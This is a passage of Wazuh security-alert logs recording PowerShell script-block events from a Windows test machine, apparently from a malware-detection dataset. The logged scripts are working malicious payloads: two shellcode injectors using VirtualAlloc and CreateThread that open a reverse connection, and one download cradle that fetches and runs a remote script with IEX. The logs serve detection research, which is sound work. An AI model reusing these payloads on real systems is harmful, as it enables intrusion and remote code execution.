0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xb5,0x81,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"e86c52b4-ea7c-4deb-b48f-2fd2d99b51b1","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1870.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:54:21.731+0000","rule":{"level":4,"description":"Powershell script querying system environment variables","id":"91816","mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]},"firedtimes":8,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015661.787545","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:51.4260822Z","eventRecordID":"201042","processID":"11652","threadID":"6188","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$n=new-object net.webclient;\r\n$n.proxy=[Net.WebRequest]::GetSystemWebProxy();\r\n$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;\r\n$n.DownloadFile(\"http://www.geocities.jp/lgxpoy6/zaavar.docx\",\"$env:temp\\zaavar.docx\");\r\nStart-Process \"$env:temp\\zaavar.docx\"\r\nIEX $n.downloadstring('http://www.geocities.jp/frgrjxq1/f0921.ps1');\r\n\r\nScriptBlock ID: bd8e8182-a4a8-4615-b7dc-4546085cab84\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1888.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$n=new-object net.webclient;  $n.proxy=[Net.WebRequest]::GetSystemWebProxy();  $n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;  $n.DownloadFile(\\\"http://www.geocities.jp/lgxpoy6/zaavar.docx\\\",\\\"$env:temp\\\\zaavar.docx\\\");  Start-Process \\\"$env:temp\\\\zaavar.docx\\\"  IEX $n.downloadstring('http://www.geocities.jp/frgrjxq1/f0921.ps1');","scriptBlockId":"bd8e8182-a4a8-4615-b7dc-4546085cab84","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1888.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:54:22.769+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":51,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015662.790923","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:52.3755797Z","eventRecordID":"201046","processID":"5668","threadID":"580","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xf5,0x82,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 406d5440-b6e6-487a-b94e-8501dea4a496\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1889.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xf5,0x82,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"406d5440-b6e6-487a-b94e-8501dea4a496","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1889.ps1"}}},"location":"EventChannel"}
